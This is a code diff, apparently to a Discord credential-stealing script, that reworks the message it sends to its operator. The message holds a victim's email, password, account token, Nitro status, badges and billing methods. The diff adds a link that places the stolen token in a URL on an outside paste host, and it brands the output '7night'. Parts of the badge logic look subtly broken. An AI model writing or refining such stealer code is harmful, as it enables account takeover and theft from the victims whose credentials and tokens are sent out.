@@ -492,7 +492,7 @@ const fetchBilling = async (token) => {
 
 const getBilling = async (token) => {
   const data = await fetchBilling(token);
-  if (!data) return '❌';
+  if (!data) return '\`No Billing\`';
   let billing = '';
   data.forEach((x) => {
     if (!x.invalid) {
@@ -501,7 +501,7 @@ const getBilling = async (token) => {
           billing += '💳 ';
           break;
         case 2:
-          billing += '<:paypal:951139189389410365> ';
+          billing += '<:Paypal:1074179763809292329> ';
           break;
       }
     }
@@ -566,61 +566,92 @@ const buyNitro = async (token) => {
 const getNitro = (flags) => {
   switch (flags) {
     case 0:
-      return 'No Nitro';
+      return '\`No Nitro\`';
     case 1:
-      return 'Nitro Classic';
+      return '\`Nitro Classic\`';
     case 2:
-      return 'Nitro Boost';
+      return '\`Nitro Boost\`';
     default:
-      return 'No Nitro';
+      return '\`No Nitro\`';
   }
 };
 
 const getBadges = (flags) => {
-  let badges = '';
-  switch (flags) {
-    case 1:
-      badges += 'Discord Staff, ';
-      break;
-    case 2:
-      badges += 'Partnered Server Owner, ';
-      break;
-    case 131072:
-      badges += 'Verified Bot Developer, ';
-      break;
-    case 4194304:
-      badges += 'Active Developer, ';
-      break;
-    case 4:
-      badges += 'Hypesquad Event, ';
-      break;
-    case 16384:
-      badges += 'Gold BugHunter, ';
-      break;
-    case 8:
-      badges += 'Green BugHunter, ';
-      break;
-    case 512:
-      badges += 'Early Supporter, ';
-      break;
-    case 128:
-      badges += 'HypeSquad Brillance, ';
-      break;
-    case 64:
-      badges += 'HypeSquad Bravery, ';
-      break;
-    case 256:
-      badges += 'HypeSquad Balance, ';
-      break;
-    case 0:
-      badges = 'None';
-      break;
-    default:
-      badges = 'None';
-      break;
+    const flagsDict = {
+      DISCORD_EMPLOYEE: {
+        emoji: "<:DiscordEmployee:1074178651832193065>",
+        shift: 0,
+        ind: 1
+      },
+      DISCORD_PARTNER: {
+        emoji: "<:PartneredServerOwner:1074178654961156236>",
+        shift: 1,
+        ind: 2
+      },
+      HYPESQUAD_EVENTS: {
+        emoji: "<:hypesquad_events:1074178656315916428>",
+        shift: 2,
+        ind: 4
+      },
+      BUG_HUNTER_LEVEL_1: {
+        emoji: "<:BugHunterGreen:1074577741803946104>",
+        shift: 3,
+        ind: 4
+      },
+      HOUSE_BRAVERY: {
+        emoji: "<:Bravery:1074178658194964630>",
+        shift: 6,
+        ind: 64
+      },
+      HOUSE_BRILLIANCE: {
+        emoji: "<:Brilliance:1074178662775144488>",
+        shift: 7,
+        ind: 128
+      },
+      HOUSE_BALANCE: {
+        emoji: "<:Balance:1074178660820590652>",
+        shift: 8,
+        ind: 256
+      },
+      EARLY_SUPPORTER: {
+        emoji: "<:Early:1074178644139835394>",
+        shift: 9,
+        ind: 512
+      },
+      BUG_HUNTER_LEVEL_2: {
+        emoji: "<:BugHunter2:1074178650326446171>",
+        shift: 14,
+        ind: 16384
+      },
+      VERIFIED_BOT_DEVELOPER: {
+        emoji: "<:Dev:1074178642613108808>",
+        shift: 17,
+        ind: 131072
+      },
+      ACTIVE_DEVELOPER: {
+        emoji: "<:ActiveDev:1074178646610280559>",
+        shift: 22,
+        ind: 4194304
+      },
+      CERTIFIED_MODERATOR: {
+        emoji: "<:CertifiedModerator:1074557948778528848>",
+        shift: 18,
+        ind: 262144
+      },
+      SPAMMER: {
+        emoji: "⌨",
+        shift: 20,
+        ind: 1048704
+      }
+    };
+  
+    return Object.keys(flagsDict).reduce((acc, flag) => {
+      if (flags & (1 << flagsDict[flag].shift)) {
+        acc.push([flagsDict[flag].emoji, flagsDict[flag].ind]);
+      }
+      return acc;
+    }, []);
   }
-  return badges;
-};
 
 const hooker = async (content) => {
   const data = JSON.stringify(content);
@@ -655,32 +686,45 @@ const login = async (email, password, token) => {
   const badges = getBadges(json.flags);
   const billing = await getBilling(token);
   const content = {
-    embeds: [
-      {
-        color: 3092790,
-        fields: [
-          {
-            name: '**Account Info**',
-            value: `Email: **${email}** - Password: **${password}**`,
-            inline: false,
-          },
-          {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: false,
-          },
-          {
-            name: '**Token**',
-            value: `\`${token}\``,
-            inline: false,
-          },
-        ],
-        author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
+    embeds: [{
+      color: 3092790,
+      fields: [{
+          name: "<a:money:1074195423276843018> Token:",
+          value: `\`${token}\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})`,
+          inline: false
+      }, {
+          name: "<:7n:1074194793690837002> Badges:",
+          value: `${badges}`,
+          inline: true
+      }, {
+          name: "<:7n:1074194791283314768> Nitro Type:",
+          value: `${nitro}`,
+          inline: true
+      }, {
+          name: "<a:7n:1074194789634936942> Billing:",
+          value: `${billing}`,
+          inline: true
+      }, {
+          name: "<:7n:1074194788154359858> Email:",
+          value: `\`${email}\``,
+          inline: true
+      }, {
+          name: "<a:7n:1074572777740320909> Password:",
+          value: `\`${password}\``,
+          inline: true
+      }],
+      author: {
+          name: `${json.username + '#' + json.discriminator} (${json.id})`,
+          icon_url: "https://cdn.discordapp.com/attachments/1069552184934539315/1074185375980982422/7night.png"
       },
-    ],
+      footer: {
+          text: "@7night",
+          icon_url: "https://cdn.discordapp.com/attachments/1069552184934539315/1074185375980982422/7night.png"
+      },
+      thumbnail: {
+          url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+      }
+  }]
   };
   if (config.ping_on_run) content['content'] = config.ping_val;
   hooker(content);
